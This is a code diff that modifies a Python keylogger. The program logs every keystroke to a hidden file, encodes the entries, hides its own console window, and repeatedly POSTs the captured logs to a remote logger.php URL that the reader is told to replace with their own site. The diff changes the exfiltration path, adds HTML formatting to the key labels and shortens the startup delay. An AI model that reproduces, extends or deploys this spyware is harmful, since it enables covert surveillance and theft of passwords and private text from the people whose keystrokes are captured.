@@ -20,7 +20,7 @@ def ende(ui):
 
 def upload():
 	while True:
-		url = 'http://example.com/logger.php' # <------- Replace this with your website
+		url = 'http://example.com/logz/logger.php' # <------- Replace this with your website
 		f = open('.logz.txt')
 		logz = f.read()
 		r = requests.post(url, data={'klogz':ende(logz)})
@@ -30,79 +30,79 @@ def upload():
 def save(key):
 	f = open('.logz.txt','a')
 	if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-		f.write(ende('<Ctrl> \n'))
+		f.write(ende('[Ctrl] \n<br>'))
 	elif key == keyboard.Key.esc:
-		f.write(ende('<Esc> \n'))
+		f.write(ende('[Esc] \n<br>'))
 	elif key == keyboard.Key.space:
 		f.write(' \n')
 	elif key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
-		f.write(ende('<Shift> \n'))
+		f.write(ende('[Shift] \n<br>'))
 	elif key == keyboard.Key.backspace:
-		f.write(ende('<Backspace> \n'))
+		f.write(ende('[Backspace] \n<br>'))
 	elif key == keyboard.Key.enter:
-		f.write(ende('<Enter> \n'))
+		f.write(ende('[Enter] \n<br>'))
 	elif key == keyboard.Key.tab:
-		f.write(ende('<Tab> \n'))
+		f.write(ende('[Tab] \n<br>'))
 	elif key == keyboard.Key.caps_lock:
-		f.write(ende('<CapsLk> \n'))
+		f.write(ende('[CapsLk] \n<br>'))
 	elif key == keyboard.Key.cmd:
-		f.write(ende('<Cmd/Win> \n'))
+		f.write(ende('[Cmd/Win] \n<br>'))
 	elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr:
-		f.write(ende('<Alt> \n'))
+		f.write(ende('[Alt] \n<br>'))
 	elif key == keyboard.Key.menu:
-		f.write(ende('<menu> \n'))
+		f.write(ende('[menu] \n<br>'))
 	elif key == keyboard.Key.left:
-		f.write(ende('<Left> \n'))
+		f.write(ende('[Left] \n<br>'))
 	elif key == keyboard.Key.right:
-		f.write(ende('<Right> \n'))
+		f.write(ende('[Right] \n<br>'))
 	elif key == keyboard.Key.down:
-		f.write(ende('<Down> \n'))
+		f.write(ende('[Down] \n<br>'))
 	elif key == keyboard.Key.up:
-		f.write(ende('<Up> \n'))
+		f.write(ende('[Up] \n<br>'))
 	elif key == keyboard.Key.insert:
-		f.write(ende('<Insert> \n'))
+		f.write(ende('[Insert] \n<br>'))
 	elif key == keyboard.Key.delete:
-		f.write(ende('<Del> \n'))
+		f.write(ende('[Del] \n<br>'))
 	elif key == keyboard.Key.home:
-		f.write(ende('<Home> \n'))
+		f.write(ende('[Home] \n<br>'))
 	elif key == keyboard.Key.end:
-		f.write(ende('<End> \n'))
+		f.write(ende('[End] \n<br>'))
 	elif key == keyboard.Key.page_down:
-		f.write(ende('<PageDown> \n'))
+		f.write(ende('[PageDown] \n<br>'))
 	elif key == keyboard.Key.page_up:
-		f.write(ende('<PageUp> \n'))
+		f.write(ende('[PageUp] \n<br>'))
 	elif key == keyboard.Key.print_screen:
-		f.write(ende('<PrintScreen> \n'))
+		f.write(ende('[PrintScreen] \n<br>'))
 	elif key == keyboard.Key.scroll_lock:
-		f.write(ende('<ScrlLk> \n'))
+		f.write(ende('[ScrlLk] \n<br>'))
 	elif key == keyboard.Key.pause:
-		f.write(ende('<Pause> \n'))
+		f.write(ende('[Pause] \n<br>'))
 	elif key == keyboard.Key.num_lock:
-		f.write(ende('<NumLk> \n'))
+		f.write(ende('[NumLk] \n<br>'))
 	elif key == keyboard.Key.f1:
-		f.write(ende('<f1> \n'))
+		f.write(ende('[f1] \n<br>'))
 	elif key == keyboard.Key.f2:
-		f.write(ende('<f2> \n'))
+		f.write(ende('[f2] \n<br>'))
 	elif key == keyboard.Key.f3:
-		f.write(ende('<f3> \n'))
+		f.write(ende('[f3] \n<br>'))
 	elif key == keyboard.Key.f4:
-		f.write(ende('<f4> \n'))
+		f.write(ende('[f4] \n<br>'))
 	elif key == keyboard.Key.f5:
-		f.write(ende('<f5> \n'))
+		f.write(ende('[f5] \n<br>'))
 	elif key == keyboard.Key.f6:
-		f.write(ende('<f6> \n'))
+		f.write(ende('[f6] \n<br>'))
 	elif key == keyboard.Key.f7:
-		f.write(ende('<f7> \n'))
+		f.write(ende('[f7] \n<br>'))
 	elif key == keyboard.Key.f8:
-		f.write(ende('<f8> \n'))
+		f.write(ende('[f8] \n<br>'))
 	elif key == keyboard.Key.f9:
-		f.write(ende('<f9> \n'))
+		f.write(ende('[f9] \n<br>'))
 	elif key == keyboard.Key.f10:
-		f.write(ende('<f10> \n'))
+		f.write(ende('[f10] \n<br>'))
 	elif key == keyboard.Key.f11:
-		f.write(ende('<f11> \n'))
+		f.write(ende('[f11] \n<br>'))
 	elif key == keyboard.Key.f12:
-		f.write(ende('<f12> \n'))
+		f.write(ende('[f12] \n<br>'))
 	else:
 		f.write(ende(str(key)).replace("'",""))
 	f.close()
@@ -134,7 +134,7 @@ print("""
 """)
 
 print("Starting..")
-time.sleep(5)
+time.sleep(1)
 winz = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(winz, win32con.SW_HIDE)
 threading.Thread(target=upload).start()
